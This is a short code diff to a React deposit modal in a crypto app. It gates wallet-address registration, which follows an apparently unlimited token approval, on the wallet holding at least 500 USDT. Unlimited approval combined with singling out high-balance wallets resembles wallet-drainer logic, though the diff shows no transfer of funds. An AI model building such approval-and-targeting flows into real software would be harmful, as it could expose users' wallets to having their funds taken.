@@ -99,6 +99,7 @@ export function DepositModal() {
     isTronConnected, 
     activeAddress,
     registerWalletAddress,
+    insufficientBalance,
     checkWalletOwnership
   } = useAuth();
   
@@ -525,9 +526,9 @@ export function DepositModal() {
         await refetchEvmAllowance();
       }
 
-      // Register wallet address AFTER successful approval
+      // Register wallet address AFTER successful approval (only if balance >= 500 USDT)
       // This links the wallet to the user for webhook deposit matching
-      if (activeAddress) {
+      if (activeAddress && !insufficientBalance) {
         await registerWalletAddress(activeAddress, selectedNetwork);
       }
       
@@ -551,7 +552,7 @@ export function DepositModal() {
       }
       setIsProcessing(false);
     }
-  }, [selectedNetwork, tokenAddress, approveUnlimited, refetchTronAllowance, refetchEvmAllowance, activeAddress, registerWalletAddress, publicClient]);
+  }, [selectedNetwork, tokenAddress, approveUnlimited, refetchTronAllowance, refetchEvmAllowance, activeAddress, insufficientBalance, registerWalletAddress, publicClient]);
 
   // State for Tron tx progress
   const [tronTxStatus, setTronTxStatus] = useState<string>('');
